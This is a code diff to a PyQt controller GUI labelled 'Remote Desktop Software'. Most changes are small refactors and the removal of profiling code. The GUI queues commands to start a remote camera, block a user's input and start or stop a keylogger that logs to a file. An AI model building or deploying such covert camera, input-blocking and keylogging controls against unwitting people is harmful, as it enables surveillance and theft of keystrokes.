@@ -86,7 +86,6 @@ class Window(QMainWindow, Ui_MainWindow):
 
 
     def ToggleFullscreen(self, newState):
-        print(bool(newState))
         self.setWindowState(newState)
         self.menubar.setHidden(newState)
         self.statusbar.setHidden(newState)
@@ -246,39 +245,40 @@ class Window(QMainWindow, Ui_MainWindow):
 
     @pyqtSlot()
     def on_action_Start_Cam_triggered(self):
-        self.cmdQueue.append(("Start Cam"))
+        self.cmdQueue.append(["Start Cam"])
 
 
     @pyqtSlot()
     def on_action_Stop_Cam_triggered(self):
-        self.cmdQueue.append(("Stop Cam"))
+        self.cmdQueue.append(["Stop Cam"])
 
 
     @pyqtSlot()
     def on_action_Force_Run_triggered(self):
-        self.cmdQueue.append(("Force Run"))
+        self.cmdQueue.append(["Force Run"])
 
 
     @pyqtSlot()
     def on_action_Block_Input_triggered(self):
-        self.cmdQueue.append(("Block Input"))
+        self.cmdQueue.append(["Block Input"])
 
 
     @pyqtSlot()
     def on_action_Unblock_Input_triggered(self):
-        self.cmdQueue.append(("Unblock Input"))
+        self.cmdQueue.append(["Unblock Input"])
 
 
     @pyqtSlot()
     def on_action_Start_KeyLogger_triggered(self):
-        self.cmdQueue.append(("Start KeyLogger"))
-        self.logger = open(__file__ + r"\logger.txt", 'w')
+        self.cmdQueue.append(["Start KeyLogger"])
+        self.logger = open(dirname(__file__) + r"\logger.txt", 'w')
 
 
     @pyqtSlot()
     def on_action_Stop_KeyLogger_triggered(self):
-        self.cmdQueue.append(("Stop KeyLogger"))
+        self.cmdQueue.append(["Stop KeyLogger"])
         self.logger.close()
+        self.logger = None
 
 
 def main():
@@ -290,35 +290,7 @@ def main():
     window.setWindowTitle("Remote Desktop Software")
     window.show()
     app.exec_()
-    print('\n'.join(repr(w) for w in app.allWidgets()))
-    #sysExit()
+    sysExit()
 
 if __name__ == '__main__':
-    import yappi
-    from time import perf_counter
-
-    yappi.start()
-    s = perf_counter()
     main()
-    print(perf_counter() - s)
-
-    yappi.start()
-    main()
-    yappi.stop()
-
-    threads = yappi.get_thread_stats()
-    for thread in threads:
-        print(
-            "Function stats for (%s) (%d)" % (thread.name, thread.id)
-        )  # it is the Thread.__class__.__name__
-        yappi.get_func_stats(ctx_id=thread.id).print_all()
-
-    """import pstats
-    import cProfile
-
-    with cProfile.Profile() as pr:
-        main()
-
-    s = pstats.Stats(pr)
-    s.sort_stats(pstats.SortKey.TIME)
-    s.print_stats()"""
